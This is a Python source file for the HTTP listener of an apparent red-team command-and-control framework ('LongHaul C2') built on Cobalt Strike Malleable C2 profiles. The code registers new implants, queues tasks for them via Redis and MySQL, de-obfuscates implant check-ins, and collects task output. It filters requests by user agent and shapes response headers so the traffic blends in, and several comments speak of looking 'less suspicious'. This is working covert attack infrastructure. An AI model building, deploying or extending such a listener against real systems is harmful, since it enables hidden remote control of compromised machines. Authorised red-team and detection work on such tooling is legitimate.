"""
HTTP Malleable C2 Listener

An HTTP Listener, which is defined by a Malleable C2 Profile.


Note on return types, keeping it simple. These are the only http status
codes used.

200: OK, continue with whatever
204: No content, things worked but nothign for you
400/404: requester fucked something up, go away/try again later
500: something went wrong

https://pypi.org/project/pyMalleableProfileParser/0.3/
"""

import logging
import re
import sys
import tempfile
from logging.handlers import RotatingFileHandler
from pathlib import Path

import msgpack

# NEW: Structlog imports
import structlog
import uvicorn
from concurrent_log_handler import ConcurrentRotatingFileHandler
from edwh_uuid7 import uuid7
from fastapi import FastAPI, HTTPException, Request, Response, status
from flask import request
from mpp import MalleableProfile
from starlette.middleware.base import BaseHTTPMiddleware
from yarl import URL

from ...db.mysql_connector import get_mysql_session
from ...modules.mysql_functions import ImplantService
from ...modules.redis_functions import RedisImplantTaskService
from ...modules.task.task import MetadataService, TaskService
from ...schemas.implant import ImplantCreate, ImplantMetadata, ImplantUpdate
from ...utils.checks import check_type
from ..malc2 import (
    HttpConfigBlockServerParser,
    HttpGetBlockClientParser,
    HttpGetBlockServerParser,
    HttpPostBlockClientParser,
    HttpPostBlockServerParser,
)

app = FastAPI
mp = MalleableProfile

listener_logger = structlog.get_logger("listener")


# entrypoint
def run(
    listener_uuid: str,
    listener_port: int,
    listener_host: str,
    listener_profile_contents: str,
):
    """The entrypoint for the listener

    Args:
        listener_uuid (str): UUID of the listener that is being spawned
    """
    # make mp global to this module so we don't have to  read from it/pass everywhere constantly
    global mp, app

    check_type(listener_uuid, str, "listener_uuid")
    check_type(listener_port, int, "listener_port")
    check_type(listener_host, str, "listener_host")
    check_type(listener_profile_contents, str, "listener_profile")

    """
    Quick explanation, mp takes a file, not a string (it has a from_string method... but it wasn't working)
    So, tempfile on the host, then pass that into the mp parser. Whatever, it works well enough. 

    Tried StringIO, didn't work either
    """
    with tempfile.NamedTemporaryFile("w+", suffix=".profile") as tmp_file:
        tmp_file.write(listener_profile_contents)
        tmp_file.flush()
        mp = MalleableProfile(profile=tmp_file.name)

    # structlog: Bind global context for this listener process
    structlog.contextvars.bind_contextvars(listener_uuid=listener_uuid)
    listener_logger.info("listener_startup", profile=str(mp.profile))

    # to shutoff docs
    # app = FastAPI(
    #     docs_url=None,
    #     redoc_url=None,
    #     openapi_url=None,
    # )

    app = FastAPI(
        title="LongHaul C2 HTTP Listener",
        description="Malleable C2 defined Listener endpoints",
        version="0.0.0",
    )

    # header handling
    app.add_middleware(HeadersMiddleware)
    app.add_middleware(DumpRequestMiddleware)

    # setup get route
    http_get_method = getattr(mp.http_get.verb, "value", "GET")
    register_http_route(
        method=http_get_method,
        uri=URL(mp.http_get.uri.value),
        endpoint=http_get,
        uri_endpoint=http_get_uri,
    )

    # setup post route
    http_post_method = getattr(mp.http_post.verb, "value", "POST")
    register_http_route(
        method=http_post_method,
        uri=URL(mp.http_post.uri.value),
        endpoint=http_post,
        uri_endpoint=http_post_uri,
    )

    # reload needs to be OFF.
    # server_header=false disabled  "server uvicorn" in the response
    uvicorn.run(
        app, host=listener_host, port=listener_port, reload=False, server_header=False
    )


###################################
# Various Handlers
###################################


def check_if_data(data_from_request):  #
    """
    Check if somehting (the request, a value you extracted, etc) had data (evaluates falsey-ness). If not, return a 400.

    data_from_request: The data that was in the request, and needs to not be empty/missing.

    Here so I don't repeat this line 58145148754 times for each case/switch
    """
    if not data_from_request:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            # intentially vague to not give away what field the data is in
            detail=f"Missing required data",
        )


def check_user_agent(user_agent: str) -> bool:
    """
    Checks user agent. If allowed (via profile), returns True
    else, False.

    Calling function should return a 404 on a check fail

    https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-server-config.htm#_Toc65482845
    """
    check_type(user_agent, str, "user_agent")

    try:
        mp.http_config
        # listener_logger.debug("http-config block not found")
        # return False
    except Exception as e:
        listener_logger.debug("config_block_error", error=str(e))
        listener_logger.debug("http-config block not found")
        # no block set, so every user agent is okay
        return True

    hcbsp = HttpConfigBlockServerParser(mp.http_config)

    # Get the blocked and allowed user agents from the configuration
    blocked_useragents = hcbsp.get_blocked_user_agents()
    allowed_useragents = hcbsp.get_allowed_user_agents()

    # listener_logger.debug("Blocked user agents:", blocked_useragents)
    # listener_logger.debug("Allowed user agents:", allowed_useragents)

    # First, check for blocked user agents
    if blocked_useragents:
        for pattern in blocked_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                listener_logger.debug(
                    "user_agent_blocked", pattern=pattern, ua=user_agent
                )
                return False  # Blocked agent

    # If blocked_useragents passed, we don't need to check allowed_useragents
    # But if allowed_useragents are specified and blocked didn't block, we check allow
    if allowed_useragents:
        for pattern in allowed_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                listener_logger.debug(
                    "user_agent_allowed", pattern=pattern, ua=user_agent
                )
                return True  # Allowed agent

    # Default return if no matches were found
    # listener_logger.debug("User-agent not allowed (no matching patterns found)")
    return True  # Default to allow through if not in blocked, and there's nothign in


# getting a 400 somehow:
#'NoneType' object has no attribute 'data'
async def deobsfucate_malleable_c2_request_data(
    request: Request,
    terminator_type,
    # coudl just require the parser class instead of adding both
    malleable_c2_block,
    parser_class,
    block_field,  # field to apply to,  ex, id, output, etc. mp.http_post.client.id otherwise parser doesn't know
    terminator_key=None,
) -> bytes:
    """
    Extracts data from the HTTP request based on the specified terminator type.
    """
    match terminator_type:
        case "header":
            # listener_logger.debug(request.headers)
            normalized_headers = {k.lower(): v for k, v in request.headers.items()}
            data_from_request = normalized_headers.get(terminator_key.lower())

            listener_logger.debug("extracting_header", key=terminator_key)
            # listener_logger.debug(f"Data from request: {data_from_request}")
            check_if_data(data_from_request)

            try:
                hce = parser_class(malleable_c2_block)
                data = hce.apply_transforms(
                    data=data_from_request, block_field=block_field
                )
                listener_logger.debug(
                    "deobfuscation_complete", type="header", len=len(data)
                )
                return data
            except Exception as e:
                listener_logger.error(
                    "deobfuscation_failed", error=str(e), type="header"
                )
                raise e

        case "parameter":
            data_from_request = request.query_params.get(terminator_key)
            # listener_logger.debug(f"Data from request: {data_from_request}")

            check_if_data(data_from_request)

            try:
                hce = parser_class(malleable_c2_block)
                data = hce.apply_transforms(
                    data=data_from_request, block_field=block_field
                )
                listener_logger.debug(
                    "deobfuscation_complete", type="parameter", len=len(data)
                )
                return data
            except Exception as e:
                listener_logger.error(
                    "deobfuscation_failed", error=str(e), type="parameter"
                )
                raise e
        case "print":
            # in body, so just get body
            data_from_request = await request.body()

            check_if_data(data_from_request)

            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request)
                listener_logger.debug(
                    "deobfuscation_complete", type="print", len=len(data)
                )
                return data
            except Exception as e:
                listener_logger.error(
                    "deobfuscation_failed", error=str(e), type="print"
                )
                raise e
        case _:
            # unknown terminator
            listener_logger.error("unknown_terminator", terminator=terminator_type)
            # throw error cuz we can't continue if we don't have the task
            raise ValueError


###################################
# Various Middleware
###################################
class HeadersMiddleware(BaseHTTPMiddleware):
    """
    Add/removes headers to each request.

    Pulls which headers to add/remove based on malleable c2 profiles
    """

    async def dispatch(self, request, call_next):
        # Call the next request handler
        response = await call_next(request)

        # err checkincase mp.http_config doesn't exist.
        try:
            mp.http_config
        except Exception as e:
            listener_logger.debug("http_config_not_found", error=str(e))
            # pass all processing, just return response
            return response

        hcbsp = HttpConfigBlockServerParser(mp.http_config)

        headers_to_add = hcbsp.get_headers_to_add_to_request()
        # get all added headers
        for header, value in headers_to_add.items():
            # del existing headers first (so you don't endup with 2 of the same)
            # RFC 7230 (Section 3.2.2) (for HTTP/1.1) states that:
            # A sender SHOULD NOT generate duplicate header fields, and a recipient SHOULD ignore duplicate header fields unless otherwise indicated."
            if header in response.headers:
                """
                Ignore header if it already exists.
                """
                continue

            # then add
            # listener_logger.debug(f"Adding header: {header}: {value}")
            response.headers[header] = value

            # could just replace too instead of deleting.

        # After constructing, reorder the headers according to the desired order
        ordered_headers = hcbsp.reorder_headers(response.headers)
        """
            oh my fuck this is kind of cursed. Had to go into the response calss
            definition, and find a method that reset the headers.
            hopefully this doesn't break in the future, but for now,
            init_headers takes a dict of headers, which overwrites the old ones.

            Headers work and are in order now

            Note: Date seems to show up first every time for some reason. 
        """
        response.init_headers(headers=ordered_headers)
        # listener_logger.debug(response.headers)

        return response


class DumpRequestMiddleware(BaseHTTPMiddleware):
    """
    Dumps request from each request

    """

    async def dispatch(self, request, call_next):
        # Call the next request handler

        body = await request.body()

        print("=== REQUEST DUMP ===")
        print("METHOD:", request.method)
        print("URL:", request.url)
        print("HEADERS:", dict(request.headers))
        print("QUERY:", dict(request.query_params))
        print("BODY:", body.decode(errors="ignore"))

        response = await call_next(request)
        return response


###################################
# HTTP GET
###################################
"""
HTTP POST with CS is where task data is retrieved from the server.

"""


async def http_get(request: Request) -> Response:
    """
    HTTP GET endpoint for the HTTP listener.
    """
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        method="GET", ip=request.client.host, path=request.url.path
    )

    # security checks
    user_agent = request.headers.get("user-agent")
    listener_logger.debug("incoming_request", ua=user_agent)

    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        listener_logger.warning("request_blocked_ua")
        return Response(status_code=404)

    """
    Handle inputted data form fastapi

    """
    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
    try:
        metadata_terminator_type, metadata_terminator_key = (
            hce.get_metadata_terminator()
        )
        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=metadata_terminator_type,
            terminator_key=metadata_terminator_key,
            malleable_c2_block=mp.http_get.client,
            block_field=mp.http_get.client.metadata,  # use metadata field to extract
            parser_class=HttpGetBlockClientParser,
        )
        listener_logger.debug("payload_extracted", len=len(data_from_implant))
    except Exception as e:
        listener_logger.error("get_processing_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    # add implant to sql

    response = http_response(data_from_implant=data_from_implant)
    return response


async def http_get_uri(request: Request) -> Response:
    """
    Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
    side.
    """
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        method="GET_URI", ip=request.client.host, path=request.url.path
    )

    try:
        path = request.url.path
        # Last segment
        data_in_uri = path.rstrip("/").split("/")[-1]
        listener_logger.debug("extracting_uri_data", segment=data_in_uri)
    except Exception as e:
        listener_logger.error("uri_parse_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    # we can assume URI terminator is uri-append.
    # data is the /someendpoint/<HERE>, so we just need to grab it, and transform it.

    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
    try:
        deobsfucated_data_from_implant = hce.apply_transforms(
            data=data_in_uri, block_field=mp.http_get.client.metadata
        )
        listener_logger.debug(
            "deobfuscation_complete", len=len(deobsfucated_data_from_implant)
        )
    except Exception as e:
        listener_logger.error("deobfuscation_failed", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    response = http_response(data_from_implant=deobsfucated_data_from_implant)
    return response


def http_response(data_from_implant):
    """
    Setup a response for the implant.
    """

    # take extracted data, shove into class:
    try:
        unpacked_metadata = msgpack.unpackb(data_from_implant)
        ImplantMetadata(**unpacked_metadata)
        # md = Metadata(unpacked_metadata)
        # md.validate()  # , if err return 400 malformed
    except Exception as e:
        listener_logger.error("metadata_validation_failed", error=str(e))
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Malformed data",
        )

    # note, payload would need to be inserted somehwere here too.  Ex,
    # redis lookup for next task -> insert where listener_logger.debug it
    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    implant_uuid = unpacked_metadata.get("implant_uuid", "")
    check_if_data(implant_uuid)

    if implant_uuid == "00000000-0000-0000-0000-00000000000":
        """
        When an implant hasn't checked in, go ahead and setup the first "task"
        for it, and do all the necessary registration steps
        """
        listener_logger.info("New implant connected")
        with get_mysql_session() as session:
            implant_service = ImplantService(session)
            data = ImplantCreate()
            implant_object = implant_service.create(data)
            implant_uuid = implant_object.implant_uuid
            # Goign to need to send implant_uuid back with first task, so it knows its UUID.  (implant id is in each task already.)

            task_uuid = str(uuid7())
            # create task dict
            task = TaskService.create_task(
                task_uuid=task_uuid,
                implant_uuid=implant_uuid,
                task_name="register",
                task_args={},
                convert_to_msgpack=False,
            )

            # write task to db, do NOT queue in redis though as we just created it
            task_service = TaskService(task=task, session=session)
            task_service._save_to_mysql()

        msgpack_task = task_service.get_as_msgpack()

    else:
        its = RedisImplantTaskService(implant_uuid)
        msgpack_task = its.dequeue_task()

    # listener_logger.debug("Warning: implant metadata not currently being stored")
    # store metadata at all? Maybe a metadata field in agent table, that gets updated (only on change)

    # STRUCTLOG: Bind the ID to the context! Now all subsequent logs in this flow have the ID.

    structlog.contextvars.bind_contextvars(implant_id=implant_uuid)

    if not msgpack_task:
        listener_logger.info("checkin_no_task")
        raise HTTPException(
            status_code=204  # 204 for no content, but the request suceeded.
        )

    listener_logger.info("checkin_task_queued")

    # pass in block to respective class
    # get the stuff we need from it
    emitter = HttpGetBlockServerParser(mp.http_get.server)
    headers = emitter.headers()
    obsfucated_task = emitter.generate_data(msgpack_task)

    terminator_type, target = emitter.get_output_terminator()

    match terminator_type:

        # case "header":
        #     # send data in a header
        #     # headers[target] = obsfucated_task
        #     # construct response here

        case "print":
            # send data in the body
            body = obsfucated_task
            # and construct the response
            return Response(content=body, headers=headers)

        case _:
            # unknown terminator
            listener_logger.error(
                "unknown_server_terminator", terminator=terminator_type
            )
            # note still sent headers to make it somewhat less suspicous
            return Response(status_code=500, headers=headers)


###################################
# HTTP POST
###################################
"""
HTTP POST with CS is where task response data is sent back to

"""


async def http_post(request: Request) -> Response:
    """
    HTTP POST endpoint for the HTTP listener.
    """
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        method="POST", ip=request.client.host, path=request.url.path
    )

    user_agent = request.headers.get("user-agent")
    listener_logger.debug("incoming_request", ua=user_agent)

    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        listener_logger.warning("request_blocked_ua")
        return Response(status_code=404)
    """
    Handle inputted data form fastapi.

    On failure,return a 400 for bad data

    """
    hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
    # extract terminator data
    # for some reason, http-post uses output, not metadata

    try:
        # BUG: output key not being retrieved for some reason
        output_terminator_type, output_terminator_key = hce.get_output_terminator()

        # check if keys, ifnot, throw a 400 (it's a server error though - so maybe change later)
        check_if_data(output_terminator_type)
        check_if_data(output_terminator_key)

        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=output_terminator_type,
            terminator_key=output_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.output,
            parser_class=HttpPostBlockClientParser,
        )
        listener_logger.debug("post_output_extracted", len=len(data_from_implant))
    except Exception as e:
        listener_logger.error("post_output_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    try:
        # note, id is always in a header or param
        # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844
        id_terminator_type, id_terminator_key = hce.get_id_terminator()

        # check if keys
        check_if_data(id_terminator_type)
        check_if_data(id_terminator_key)

        implant_uuid_bytes = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=id_terminator_type,
            terminator_key=id_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.id,
            parser_class=HttpPostBlockClientParser,
        )

        # note, implant_uuid is now bytes. Need to convert to a string before passing in to redis
        implant_uuid = implant_uuid_bytes.decode()

        # STRUCTLOG: Bind ID
        structlog.contextvars.bind_contextvars(implant_id=implant_uuid)
        listener_logger.info("implant_id_extracted")

    except Exception as e:
        listener_logger.error("post_id_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    response = http_post_response(
        data_from_implant=data_from_implant, implant_uuid=implant_uuid
    )
    return response


async def http_post_uri(request: Request, data: str) -> Response:
    """POST endpoint specifially for the 'uri-append' option in malleable c2"""
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        method="POST_URI", ip=request.client.host, path=request.url.path
    )

    # we can assume URI terminator is uri-append.
    # data is the /someendpoint/<HERE>, so we just need to transform it.

    # full_uri = str(
    #     request.url
    # )  # Full URL including the scheme, host, path, and query params. useful for logging

    try:
        hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
        output_terminator_type, output_terminator_key = hce.get_output_terminator()

        # check if keys, ifnot, throw a 400 (it's a server error though - so maybe change later)
        check_if_data(output_terminator_type)
        check_if_data(output_terminator_key)

        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=output_terminator_type,
            terminator_key=output_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.output,
            parser_class=HttpPostBlockClientParser,
        )
        listener_logger.debug("post_uri_output_extracted")

    except Exception as e:
        listener_logger.error("post_uri_output_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    try:
        # note, id is always in a header or param
        # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844
        id_terminator_type, id_terminator_key = hce.get_id_terminator()

        # check if keys
        check_if_data(id_terminator_type)
        check_if_data(id_terminator_key)

        implant_uuid_bytes = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=id_terminator_type,
            terminator_key=id_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.id,
            parser_class=HttpPostBlockClientParser,
        )

        # note, implant_uuid is now bytes. Need to convert to a string before passing in to redis
        implant_uuid = implant_uuid_bytes.decode()

        # STRUCTLOG: Bind ID
        structlog.contextvars.bind_contextvars(implant_id=str(implant_uuid))
        listener_logger.info("implant_id_extracted")

    except Exception as e:
        listener_logger.error("post_uri_id_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    response = http_post_response(
        data_from_implant=data_from_implant, implant_uuid=implant_uuid
    )
    return response


def http_post_response(data_from_implant, implant_uuid):
    """
    Setup a response for the implant

    """
    # pass in block to respective class
    emitter = HttpPostBlockServerParser(mp.http_post.server)

    # get the stuff we need from it
    headers = emitter.headers()

    # spin up redis class, write deobsfucated data to redis.
    # this will get picked up by the redis batch watchdog and write to mysql
    rits = RedisImplantTaskService(implant_uuid)
    rits.enqueue_response(data_from_implant)

    listener_logger.info("task_response_enqueued")

    terminator_type, target = emitter.get_output_terminator()

    # adjust to listener_logger.debug
    # also, find out what data the server sends back on a post.
    # it's somhwere in those malleable c2 docs with the flow of a req.
    # looks to be emptyy.

    """
    Request     Component   Block       Data
    http-get    client      metadata    Session metadata
    http-get    server      output      Beacon’s tasks
    http-post   client      id          Session ID
    http-post   client      output      Beacon’s responses
    http-post   server      output      Empty
    http-stager server      output      Encoded payload stage
    """

    match terminator_type:
        # case "header":
        #     # send data in a header
        #     # headers[target] = data
        #     # construct response here

        case "print":
            # server post sends none after a task result is sent in.
            # 200 back, no content (make sure it's not null...)
            return Response(status_code=200, content=None, headers=headers)

        case _:
            # unknown terminator
            listener_logger.error(
                "unknown_server_terminator", terminator=terminator_type
            )
            # note still sent headers to make it somewhat less suspicous
            return Response(status_code=500, headers=headers)


###################################
# Route setup
###################################


def register_http_route(uri: URL, method: str, endpoint, uri_endpoint):
    """
    Registeres routes. Prevents these being called on import as well.
    """
    check_type(uri, URL, "uri")
    check_type(method, str, "method")
    # function is not defined, some weird python type only thing.
    # check_type(uri_endpoint, function, "uri_endpoint")

    app.add_api_route(
        path=str(URL(uri)),
        endpoint=endpoint,  # logic for endpoint here
        methods=[method],
        # response_model=dict,
        # tags=["items"],
    )

    # for uri-append, add another route
    # hack together a string for what it wants: "myuri/{data}"
    full_uri = str(uri) + "/{data}"
    # Register the route with the dynamic path
    app.add_api_route(
        path=str(full_uri),
        endpoint=uri_endpoint,  # The handler function for this route
        methods=[method],
    )
    """
    Why Two Routes are Needed in FastAPI:

    FastAPI resolves routes based on exact paths. When using Cobalt Strike's `uri-append` 
        (e.g., `/myuri/some-random-data`), FastAPI treats `/myuri` as a fixed endpoint and doesn't automatically handle `/myuri/{data}`. 

    To handle this, you need two routes:
    1. One for the base path (`/myuri`). (note, /myuri/ will 307 -> /myuri, this is fine)
    2. Another for the dynamic append (`/myuri/{data}`).

    This way, FastAPI can process both the static and dynamic parts of the URL correctly.    
    """
